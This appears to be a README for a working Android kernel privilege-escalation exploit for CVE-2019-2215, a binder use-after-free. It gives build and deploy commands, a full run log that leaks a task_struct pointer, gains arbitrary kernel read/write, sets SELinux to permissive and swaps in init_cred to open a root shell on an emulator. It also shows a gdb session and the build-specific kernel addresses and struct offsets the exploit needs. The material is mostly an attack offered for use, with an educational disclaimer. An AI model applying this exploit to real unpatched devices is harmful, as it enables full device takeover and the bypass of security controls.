# CVE-2019-2215

## DISCLAIMER: THE CODE PROVIDED HERE IS FOR EDUCATIONAL AND SHOWCASING PURPOSE ONLY. I DO NOT SUPPORT, NOR TAKE ANY RESPONSIBILITY FOR ANYONE THAT USES THIS CODE (OR THE INFORMATION IN IT, OR ITS BUILD, OR ANYTHING IN THIS REPOSITORY) FOR ILLEGAL OR IMMORAL REASONS

## Credits
Based on a [proof-of-concept](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942) by Jann Horn & Maddie Stone of Google Project Zero

Special thanks to [CloudFuzz's workshop](https://cloudfuzz.github.io/android-kernel-exploitation/) for making it possible for me to write this exploit.

More thanks to [kangtastic](https://github.com/kangtastic/) for providing another source of reference.


## Usage
To build the exploit:

    NDK_ROOT=~/Android/Sdk/ndk/22.0.7026061 make

To build the exploit and upload it to a running device (using android studio emulator):

    NDK_ROOT=~/Android/Sdk/ndk/22.0.7026061 make build-exploit push-exploit

Example usage:

    mohamed@mohamed-G5-5590:~/Desktop/android/CVE-2019-2215$ NDK_ROOT=~/Android/Sdk/ndk/22.0.7026061 make build-exploit push-exploit
    Building: cve-2019-2215-exploit
    Pushing: cve-2019-2215-exploit to /data/local/tmp
    cve-2019-2215-exploit: 1 file pushed, 0 skipped. 480.0 MB/s (4891248 bytes in 0.010s)
    File located in: /data/local/tmp/cve-2019-2215-exploit
    mohamed@mohamed-G5-5590:~/Desktop/android/CVE-2019-2215$ adb shell
    generic_x86_64:/ $ id                                   
    uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
    generic_x86_64:/ $ /data/local/tmp/cve-2019-2215-exploit
    [+] Allocating 4Gb aligned page...
        [+] Allocating page
        [+] Filling page with 'A's
        [+] Dummy page pointer: 0x100000000
    [*] Page allocated successfully
    [+] Leaking task_struct pointer...
        [+] Allocating binder and epoll file descriptors
        [+] Creating Pipe
        [+] Constructing IOVEC stack
        [+] Forking child process
        [+] Allocating and linking binder_thread structure
        [+] Freeing binder_thread structure
        [+] Reallocating binder_thread structure as IOVECs
        [+] CHILD Triggering unlink
        [+] CHILD Reading 65536 'A's from pipe
        [+] CHILD Exiting
        [+] Reading leaked task_struct pointer
        [+] Leaked task_struct pointer: 0xffff888010731b80
        [+] Closing binder and epoll file descriptors
        [+] Closing any file descriptors allocated by the function
    [*] Leaked task_struct pointer successfully
    [+] Getting arbitrary Read-Write permissions...
        [+] Allocating binder and epoll file descriptors
        [+] Creating socket
        [+] Writing junk data to socket
        [+] Constructing IOVEC stack
        [+] Crafting socket input data
        [+] Creating message header object
        [+] Forking child process
        [+] Allocating and linking binder_thread structure
        [+] Freeing binder_thread structure
        [+] Reallocating binder_thread structure as IOVECs
        [+] CHILD Triggering unlink
        [+] CHILD Reading 65536 'A's from pipe
        [+] CHILD Exiting
        [+] Verifying arbitrary R/W vector
        [+] Opening kernel R/W pipe
        [+] PID 7359 verified
        [+] Closing binder and epoll file descriptors
        [+] Closing any file descriptors allocated by the function
    [*] Got arbitrary Read-Write permissions successfully
    [+] Setting SELinux to permissive mode...
        [+] SELinux enforcing flag located at 0xffffffff816acfe8
        [+] SELinux enforcing flag already set to zero (permissive mode)
    [*] Set SELinux to permissive mode successfully
    [+] Updating kernel-space cred structure...
        [+] Copying nsproxy pointer from kernel-space
        [+] init_nsproxy structure address: 0xffffffff81433ac0
        [+] Kernel base address: 0xffffffff80200000
        [+] init_cred structure address: 0xffffffff81433c30
        [+] init_cred usage count: 0x2
        [+] Setting init_cred usage count to: 0x3
        [+] Setting task_struct credentials to init_cred
        [+] New process UID: 0
        [+] Closing kernel R/W pipe
    [*] Updated kernel-space cred structure successfully

    Exploitation Successful! Opening Privileged Shell...
    generic_x86_64:/ # id
    uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
    generic_x86_64:/ # exit

    Exiting Privileged Shell...
    generic_x86_64:/ $ exit
    mohamed@mohamed-G5-5590:~/Desktop/android/CVE-2019-2215$

## Debugging
In order to debug the exploit:

    gdb -quiet ./path/to/dist/vmlinux -x commands.gdb

Note that running the exploit while gdb is connected makes it very unreliable, so only connect gdb when needed. Example debugging session:

    mohamed@mohamed-G5-5590:~/Desktop/android/CVE-2019-2215$ gdb -quiet ../workshop/android-4.14-dev/out/relwithdebinfo/dist/vmlinux -x commands.gdb
    Reading symbols from ../workshop/android-4.14-dev/out/relwithdebinfo/dist/vmlinux...
    Note: running the exploit while gdb is connected makes it very unreliable, so only connect gdb when needed
    warning: while parsing target description (at line 1): Could not load XML document "i386-64bit.xml"
    warning: Could not load XML target description; ignoring
    native_safe_halt ()
        at /home/mohamed/Desktop/android/workshop/android-4.14-dev/goldfish/arch/x86/include/asm/irqflags.h:61
    61	}
    ^C
    Program received signal SIGINT, Interrupt.
    native_safe_halt ()
        at /home/mohamed/Desktop/android/workshop/android-4.14-dev/goldfish/arch/x86/include/asm/irqflags.h:61
    61	}
    Breakpoint 1 at 0xffffffff80823785: file /home/mohamed/Desktop/android/workshop/android-4.14-dev/goldfish/drivers/android/binder.c, line 4701.
    Breakpoint 2 at 0xffffffff802aa69d: file /home/mohamed/Desktop/android/workshop/android-4.14-dev/goldfish/kernel/sched/wait.c, line 50.
    Breakpoint 3 at 0xffffffff802aa6d5: file /home/mohamed/Desktop/android/workshop/android-4.14-dev/goldfish/kernel/sched/wait.c, line 53.

    Breakpoint 1, binder_free_thread (thread=0xffff888011821000) at /home/mohamed/Desktop/android/workshop/android-4.14-dev/goldfish/drivers/android/binder.c:4701
    4701		BUG_ON(!list_empty(&thread->todo));
    0xffff888011821000:	0xffff888028f72400	0x0000000000000001
    0xffff888011821010:	0x0000000000000000	0x0000000000000000
    0xffff888011821020:	0xffff888011821020	0xffff888011821020
    0xffff888011821030:	0x0000002000001a13	0x0000000000000001
    0xffff888011821040:	0x0000000000000000	0xffff888011821048
    0xffff888011821050:	0xffff888011821048	0x0000000000000000
    0xffff888011821060:	0x0000000000000000	0x0000000000000000
    0xffff888011821070:	0x0000000000000003	0x0000000000007201
    0xffff888011821080:	0x0000000000000000	0x0000000000000000
    0xffff888011821090:	0x0000000000000003	0x0000000000007201
    0xffff8880118210a0:	0x0000000000000000	0xffff88806a848198
    0xffff8880118210b0:	0xffff88806a848198	0x0000000000000000
    0xffff8880118210c0:	0x0000000000000000	0x0000000000000000
    0xffff8880118210d0:	0x0000000000000000	0x0000000000000000
    0xffff8880118210e0:	0x0000000000000000	0x0000000000000000
    0xffff8880118210f0:	0x0000000000000000	0x0000000000000000
    0xffff888011821100:	0x0000000000000000	0x0000000000000000
    0xffff888011821110:	0x0000000000000000	0x0000000000000000
    0xffff888011821120:	0x0000000000000000	0x0000000000000000
    0xffff888011821130:	0x0000000000000000	0x0000000000000000
    0xffff888011821140:	0x0000000000000000	0x0000000000000000
    0xffff888011821150:	0x0000000000000000	0x0000000000000000
    0xffff888011821160:	0x0000000000000000	0x0000000000000000
    0xffff888011821170:	0x0000000000000000	0x0000000000000000
    0xffff888011821180:	0x0000000000000000	0x0000000000000001
    0xffff888011821190:	0xffff88804fab3700

    Breakpoint 2, remove_wait_queue (wq_head=0xffff8880118210a0, wq_entry=0xffff88806a848180) at /home/mohamed/Desktop/android/workshop/android-4.14-dev/goldfish/kernel/sched/wait.c:50
    50		spin_lock_irqsave(&wq_head->lock, flags);
    0xffff888011821000:	0x0000000000000000	0x0000000000000000
    0xffff888011821010:	0x0000000000000000	0x0000000000000000
    0xffff888011821020:	0x0000000000000000	0x0000000000000000
    0xffff888011821030:	0x0000000000000000	0x0000000000000000
    0xffff888011821040:	0x0000000000000000	0x0000000000000000
    0xffff888011821050:	0x0000000000000000	0x0000000000000000
    0xffff888011821060:	0x0000000000000000	0x0000000000000000
    0xffff888011821070:	0x0000000000000000	0x0000000000000000
    0xffff888011821080:	0x0000000000000000	0x0000000000000000
    0xffff888011821090:	0x0000000000000000	0x0000000000000000
    0xffff8880118210a0:	0x0000000100000000	0x0000000000010000
    0xffff8880118210b0:	0x00000000deadbeef	0x0000000000010000
    0xffff8880118210c0:	0x0000000000000000	0x0000000000000000
    0xffff8880118210d0:	0x0000000000000000	0x0000000000000000
    0xffff8880118210e0:	0x0000000000000000	0x0000000000000000
    0xffff8880118210f0:	0x0000000000000000	0x0000000000000000
    0xffff888011821100:	0x0000000000000000	0x0000000000000000
    0xffff888011821110:	0x0000000000000000	0x0000000000000000
    0xffff888011821120:	0x0000000000000000	0x0000000000000000
    0xffff888011821130:	0x0000000000000000	0x0000000000000000
    0xffff888011821140:	0x0000000000000000	0x0000000000000000
    0xffff888011821150:	0x0000000000000000	0x0000000000000000
    0xffff888011821160:	0x0000000000000000	0x0000000000000000
    0xffff888011821170:	0x0000000000000000	0x0000000000000000
    0xffff888011821180:	0x0000000000000000	0x0000000000000000
    0xffff888011821190:	0xffff88804fab3700

    Breakpoint 3, remove_wait_queue (wq_head=0xffff8880118210a0, wq_entry=0xffff88806a848180) at /home/mohamed/Desktop/android/workshop/android-4.14-dev/goldfish/kernel/sched/wait.c:53
    53	}
    0xffff888011821000:	0x0000000000000000	0x0000000000000000
    0xffff888011821010:	0x0000000000000000	0x0000000000000000
    0xffff888011821020:	0x0000000000000000	0x0000000000000000
    0xffff888011821030:	0x0000000000000000	0x0000000000000000
    0xffff888011821040:	0x0000000000000000	0x0000000000000000
    0xffff888011821050:	0x0000000000000000	0x0000000000000000
    0xffff888011821060:	0x0000000000000000	0x0000000000000000
    0xffff888011821070:	0x0000000000000000	0x0000000000000000
    0xffff888011821080:	0x0000000000000000	0x0000000000000000
    0xffff888011821090:	0x0000000000000000	0x0000000000000000
    0xffff8880118210a0:	0x0000000100000000	0xffff8880118210a8
    0xffff8880118210b0:	0xffff8880118210a8	0x0000000000010000
    0xffff8880118210c0:	0x0000000000000000	0x0000000000000000
    0xffff8880118210d0:	0x0000000000000000	0x0000000000000000
    0xffff8880118210e0:	0x0000000000000000	0x0000000000000000
    0xffff8880118210f0:	0x0000000000000000	0x0000000000000000
    0xffff888011821100:	0x0000000000000000	0x0000000000000000
    0xffff888011821110:	0x0000000000000000	0x0000000000000000
    0xffff888011821120:	0x0000000000000000	0x0000000000000000
    0xffff888011821130:	0x0000000000000000	0x0000000000000000
    0xffff888011821140:	0x0000000000000000	0x0000000000000000
    0xffff888011821150:	0x0000000000000000	0x0000000000000000
    0xffff888011821160:	0x0000000000000000	0x0000000000000000
    0xffff888011821170:	0x0000000000000000	0x0000000000000000
    0xffff888011821180:	0x0000000000000000	0x0000000000000000
    0xffff888011821190:	0xffff88804fab3700

    ...

## Build Notes
Some constants in `exploit.h` are build-specific, namely:

    // System.map
    // ffffffff80200000 T _stext
    // ffffffff81433ac0 D init_nsproxy
    // ffffffff816acfe8 B selinux_enforcing
    // ffffffff81433c30 D init_cred

    #define KERNEL_BASE         0xffffffff80200000ul
    #define INIT_NSPROXY        0xffffffff81433ac0ul
    #define SELINUX_ENFORCING   0xffffffff816acfe8ul
    #define INIT_CRED           0xffffffff81433c30ul

AND

    // Variable offsets
    // macro define offsetof(_type, _memb) ((long)(&((_type *)0)->_memb))
    #define ADDR_LIMIT_OFFSET   0xa18ul // p /x (long)offsetof(struct task_struct, thread) + (long)offsetof(struct thread_struct, addr_limit)
    #define PID_OFFSET          0x4e8ul // p /x offsetof(struct task_struct, pid)
    #define NSPROXY_OFFSET      0x6c0ul // p /x offsetof(struct task_struct, nsproxy)
    #define REAL_CRED_OFFSET    0x680ul // p /x offsetof(struct task_struct, real_cred)

The first set of constants can be retrieved from the `System.map` file of the target build, and the second set of constants can be calculated using their respective gdb commands.